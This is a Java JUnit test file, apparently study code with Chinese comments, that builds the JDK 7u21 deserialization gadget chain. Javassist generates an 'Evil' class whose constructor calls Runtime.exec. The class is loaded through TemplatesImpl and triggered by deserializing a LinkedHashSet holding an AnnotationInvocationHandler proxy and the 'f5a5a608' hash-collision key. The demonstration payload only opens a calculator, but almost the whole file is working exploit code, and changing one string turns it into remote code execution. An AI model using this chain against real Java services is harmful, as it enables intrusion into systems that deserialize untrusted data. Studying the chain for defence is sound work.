package org.example.sec.ser;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.junit.Test;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;

//https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#Javassist
public class Java7u21 {
    @Test
    public void testTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("Test");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //在TemplatesImpl类里面定义了一个内部类TranslateClassLoader继承自ClassLoader
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        //newTransformer 会触发defineclass，加载bytecodes
        templates.newTransformer();
    }
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //序列化
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }
    //反序列化
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }



    //封装了之前对恶意TemplatesImpl类的构造
    private static TemplatesImpl getEvilTemplatesImpl() throws Exception{
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode=cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates,"_bytecodes",targetByteCode);
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_name","xx");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        return templates;
    }

    @Test
    public  void exp2() throws Exception {
        TemplatesImpl templates=getEvilTemplatesImpl();

        HashMap map = new HashMap();

        //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        Templates proxy = (Templates) Proxy.newProxyInstance(Java7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        //e.hash = hash
        set.add(proxy);

        //在set后添加
        map.put("f5a5a608", templates);

        byte[] obj=serialize(set);
        unserialize(obj);
    }
}
